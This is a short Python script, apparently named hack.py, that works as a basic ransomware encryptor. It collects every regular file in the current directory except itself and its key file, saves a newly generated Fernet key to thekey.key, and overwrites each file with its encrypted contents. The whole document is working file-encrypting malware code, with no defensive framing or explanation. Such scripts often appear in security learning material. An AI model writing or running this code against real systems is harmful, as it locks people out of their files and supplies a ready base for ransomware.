#!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet

#let's find some files

files = []

for file in os.listdir():
	if file == "hack.py" or file == "thekey.key":
		continue
	#files.append(file) #also add the folder
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

#print(f"This is key : {key}")

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
